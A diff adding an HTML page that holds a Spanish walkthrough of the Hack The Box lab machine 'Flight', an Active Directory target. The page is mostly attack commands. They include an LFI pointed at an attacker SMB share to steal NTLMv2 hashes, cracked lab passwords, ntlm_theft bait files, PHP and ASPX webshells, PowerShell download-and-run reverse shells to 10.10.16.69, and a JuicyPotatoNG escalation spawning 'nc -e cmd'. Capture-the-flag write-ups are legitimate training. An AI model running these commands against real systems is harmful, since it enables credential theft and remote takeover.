@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Flight HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/flight/pasted-image-20260304185219.png" alt="Flight HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Flight</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>VHosts</span>
+            <span>LFI</span>
+            <span>ntlm_theft</span>
+            <span>juicypotatong</span>
+            <span>runas</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Enumeración de <code>VHosts</code> hasta encontrar un subdominio</li>
+            <li><code>Explotación</code>: <code>LFI</code> con filtros accedemos a un recurso de kali para obtener el hash del usuario del dominio con responder</li>
+            <li><code>Movimiento lateral</code>: Password Spray reutilizando contraseñas</li>
+            <li><code>Movimiento lateral</code>: Share con permiso de escritura donde <code>ntlm_theft</code> permite preparar ficheros para capturar un hash <code>NTLMv2</code></li>
+            <li><code>Movimiento lateral</code>: Share web con permiso de escritura que permite subir una webshell <code>PHP</code></li>
+            <li><code>Movimiento lateral</code>: Acceso al host, descubrimiento de <code>IIS</code> interno, port forwarding y ejecución con <code>cmd.aspx</code></li>
+            <li><code>Escalada de Privilegios</code>: Impersonate con JuicyPotatoNG</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260304190811.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Enumerar subdominios</h3>
+            <pre><code>ffuf -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
+# -fs 229 -&gt; Ignora respuestas con ese tamaño
+
+# HOST:         flight.htb
+# VHOST: school.flight.htb
+
+# Agregar el dominio al /etc/hosts
+10.129.42.88 school.flight.htb</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: LFI con filtro para acceder a un recurso de kali y obtener hash NTLMv2</h2>
+          <div class="code-card">
+            <h3>LFI</h3>
+            <pre><code># Ruta index.php
+http://school.flight.htb/index.php?view=about.html
+# LFI con barras \ filtrado
+http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts
+# LFI con barras / (Windows permite ambas barra para acceder a sus recursos)
+http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listener</h3>
+            <pre><code>impacket-smbserver smb $(pwd) -smb2support -debug</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>LFI payload</h3>
+            <pre><code>http://school.flight.htb/index.php?view=//10.10.16.69/htb
+# Obtenemos hash NTLMv2 de svc_apache</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Crack hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; svc_apache:S@Ss!K@*t13</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260329215847.png" alt="Flight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Password Spray reutilizando contraseñas</h2>
+          <div class="code-card">
+            <h3>Lista de usuario</h3>
+            <pre><code>nxc smb flight.htb -u &#x27;svc_apache&#x27; -p &#x27;S@Ss!K@*t13&#x27; --users</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Password Spray con la misma contraseña de svc_apache</h3>
+            <pre><code>nxc smb flight.htb -u users -p &#x27;S@Ss!K@*t13&#x27;
+# Credenciales -&gt; S.Moon:S@Ss!K@*t13</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260329220115.png" alt="Flight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: ntlm_theft obtener hash NTLMv2 desde un Share</h2>
+          <div class="code-card">
+            <h3>Recursos Compartidos</h3>
+            <pre><code>nxc smb flight.htb -u &#x27;S.Moon&#x27; -p &#x27;S@Ss!K@*t13&#x27; --shares
+# No hay nada en Shared pero como podemos escribir subiremos un fichero malicioso con ntlm_theft a la espera de que alguien pinche y capturemos su hash NTLMv2</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260401220216.png" alt="Flight HTB" />
+          <p><a href="https://github.com/Greenwolf/ntlm_theft" target="_blank" rel="noreferrer">ntlm_theft</a></p>
+          <div class="code-card">
+            <h3>Crear Fichero malicioso para capturar hash NTLMv2 al abrirlo</h3>
+            <pre><code>python3 ntlm_theft.py -g all -s 10.10.16.69 -f payload
+# Genera payloads en ficheros en diferentes formatos para ver cual nos permite cargar el sistema</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Listener</h3>
+            <pre><code>responder -I tun0 -v
+# Alternativa
+impacket-smbserver smb $(pwd) -smb2support -debug</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Subir payload</h3>
+            <pre><code>smbclient //g0/Shared -U &#x27;S.Moon&#x27; 
+# Credenciales -&gt; S.Moon:S@Ss!K@*t13
+# El sistema nos permite cargar solo el fichero desktop.ini</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402005341.png" alt="Flight HTB" />
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402005448.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Crackear hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; c.bum:Tikkycoll_431012284</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Share relacionado con la Web con permiso de escritura</h2>
+          <div class="code-card">
+            <h3>Enumerar shares</h3>
+            <pre><code>nxc smb flight.htb -u &#x27;c.bum&#x27; -p &#x27;Tikkycoll_431012284&#x27; --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402010125.png" alt="Flight HTB" />
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402010254.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Subir RCE en PHP</h3>
+            <pre><code>cp /usr/share/davtest/backdoors/php_cmd.php .
+smbclient //g0/Web -U &#x27;c.bum&#x27;
+cd flight.htb
+put php_cmd.php
+# URL: http://flight.htb/php_cmd.php?cmd=whoami</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402010512.png" alt="Flight HTB" />
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402010526.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Reverse Shell</h3>
+            <pre><code># Listener
+penelope -p 443
+# Hostear Nishang
+
+# URL: http://flight.htb/php_cmd.php?cmd=powershell%20IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.16.69/Invoke-PowerShellTcp.ps1%27)</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402010702.png" alt="Flight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: RunasCs</h2>
+          <div class="code-card">
+            <h3>RunasCs</h3>
+            <pre><code># Reverse Shell a penelope -p 4443
+.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.16.69:4443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402013506.png" alt="Flight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: descubrir IIS interno, hacer port forwarding y subir RCE en ASPX</h2>
+          <div class="code-card">
+            <h3>Enumerar directorios desde la raíz</h3>
+            <pre><code>dir /
+# Vemos un inetpub que es un IIS que no enumeramos con nmap</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402015613.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Enumerar servicios http corriendo en el host</h3>
+            <pre><code>netsh http show servicestate
+# Puerto 8000 corre internamente IIS</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402015907.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Enumerar puertos internos en busca del IIS</h3>
+            <pre><code>netstat -ano
+# Comprobar Puerto 8000</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402015702.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Subir cmd.aspx a la raíz del IIS</h3>
+            <pre><code>cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402020254.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>PortForwarding</h3>
+            <pre><code># Kali 
+chisel server -p 9090 --reverse --socks5
+# Windows
+.\chisel client 10.10.16.69:9090  R:8000:127.0.0.1:8000</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402020553.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>URL cmd.aspx</h3>
+            <pre><code># URL: http://localhost:8000/cmd.aspx</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402020651.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Reverse Shell</h3>
+            <pre><code># Hostear Nishang y modificar puerto del binario
+python -m http.server 8080
+# Listener
+peneloe -p 4442
+# Comando RCE
+powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.69:8080/Invoke-PowerShellTcp.ps1&#x27;)</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402021018.png" alt="Flight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Impersonate</h2>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402021141.png" alt="Flight HTB" />
+          <div class="code-card">
+            <h3>Impersonate con JuicyPotatoNG</h3>
+            <pre><code>.\JuicyPotatoNG.exe -t * -p &quot;C:\Windows\system32\cmd.exe&quot; -a &quot;/c C:\windows\temp\prives\nc.exe 10.10.16.69 4441 -e cmd&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/flight/pasted-image-20260402024207.png" alt="Flight HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>VHosts</span>
+            <span>LFI</span>
+            <span>ntlm_theft</span>
+            <span>juicypotatong</span>
+            <span>runas</span>
+            <span>portforwarding</span>
+            <span>impersonate</span>
+            <span>rce</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
